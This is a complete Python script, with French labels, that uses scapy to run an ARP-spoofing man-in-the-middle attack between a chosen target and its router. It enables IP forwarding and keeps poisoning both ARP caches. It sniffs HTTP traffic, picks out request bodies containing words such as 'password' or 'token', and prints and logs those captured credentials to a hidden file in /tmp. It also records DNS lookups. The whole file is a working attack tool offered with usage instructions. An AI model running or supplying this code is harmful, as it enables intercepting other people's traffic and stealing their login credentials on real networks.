import threading
import sys
import os
import scapy.all as scapy
from scapy.layers import http
import time


LOG_FILE = "/tmp/.mitm_log.txt"

def get_mac(ip):
    req  = scapy.ARP(pdst=ip)
    bc   = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    rep  = scapy.srp(bc/req, timeout=2, verbose=False)[0]
    return rep[0][1].hwsrc

def empoisonner(ip_cible, ip_routeur):
    scapy.send(scapy.ARP(
        op=2, pdst=ip_cible,
        hwdst=get_mac(ip_cible),
        psrc=ip_routeur
    ), verbose=False)

def restaurer(ip_cible, ip_routeur):
    scapy.send(scapy.ARP(
        op=2, pdst=ip_cible,
        hwdst=get_mac(ip_cible),
        psrc=ip_routeur,
        hwsrc=get_mac(ip_routeur)
    ), count=5, verbose=False)

def thread_poison(ip_cible, ip_routeur, stop_event):
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    n = 0
    while not stop_event.is_set():
        empoisonner(ip_cible, ip_routeur)
        empoisonner(ip_routeur, ip_cible)
        n += 2
        print(f"\r[ARP] Paquets envoyés : {n}", end="", flush=True)
        time.sleep(2)

def analyser_paquet(paquet):
    if paquet.haslayer(http.HTTPRequest):
        url = paquet[http.HTTPRequest].Host.decode() + \
              paquet[http.HTTPRequest].Path.decode()
        print(f"\n[HTTP] → {url}")
        if paquet.haslayer(scapy.Raw):
            corps = paquet[scapy.Raw].load.decode(errors="ignore")
            mots  = ["user","pass","login","email","password","pwd","token"]
            if any(m in corps.lower() for m in mots):
                print(f"\n{'='*50}")
                print(f"[!!!] CREDENTIALS INTERCEPTÉS")
                print(f"URL  : {url}")
                print(f"DATA : {corps}")
                print(f"{'='*50}\n")
                with open(LOG_FILE, "a") as f:
                    f.write(f"URL: {url}\nDATA: {corps}\n{'─'*40}\n")
    if paquet.haslayer(scapy.DNSQR):
        d = paquet[scapy.DNSQR].qname.decode()
        if not d.endswith(".local."):
            print(f"[DNS] {d}")

def lancer(ip_cible, ip_routeur, interface="eth0"):
    print(f"""
╔══════════════════════════════════════╗
║         MITM ATTACK ACTIF           ║
╠══════════════════════════════════════╣
║  Cible   : {ip_cible:<26}║
║  Routeur : {ip_routeur:<26}║
║  Interface : {interface:<24}║
║  Ctrl+C pour arrêter proprement     ║
╚══════════════════════════════════════╝
""")
    stop_event = threading.Event()


    t = threading.Thread(
        target=thread_poison,
        args=(ip_cible, ip_routeur, stop_event),
        daemon=True
    )
    t.start()


    try:
        scapy.sniff(iface=interface, store=False, prn=analyser_paquet)
    except KeyboardInterrupt:
        print("\n[*] Arrêt — nettoyage...")
        stop_event.set()
        restaurer(ip_cible, ip_routeur)
        restaurer(ip_routeur, ip_cible)
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("[+] Table ARP restaurée. MITM terminé.")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage : sudo python3 mitm.py <IP_CIBLE> <IP_ROUTEUR> [INTERFACE]")
        print("Exemple : sudo python3 mitm.py 192.168.1.42 192.168.1.1 eth0")
        sys.exit(1)
    iface = sys.argv[3] if len(sys.argv) > 3 else "eth0"
    lancer(sys.argv[1], sys.argv[2], iface)